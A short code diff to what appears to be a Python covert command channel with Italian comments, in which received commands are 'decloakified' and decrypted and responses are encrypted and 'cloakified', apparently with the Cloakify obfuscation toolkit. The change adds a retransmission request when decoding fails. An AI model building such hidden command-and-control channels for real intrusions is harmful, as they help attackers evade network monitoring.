@@ -30,7 +30,10 @@ def receive_command():
         
     # Decloakificare il comando
     print("Decloakifying...")
-    Decloakify(cloaked_command, cipher, decloaked_command)
+    if Decloakify(cloaked_command, cipher, decloaked_command) == -1:
+        print("Requesting re-trasmission")
+        send_response('rt')
+        receive_command()
 
     # Decrypt command
     with open(decloaked_command, 'r') as file:
@@ -60,6 +63,7 @@ def send_response(response):
 
     # Cloakificare la risposta
     cloaked_response = "cloaked_response.txt"
+    
     Cloakify(encrypted_response, cipher, cloaked_response)
     
     #print("Initializing response transfer")
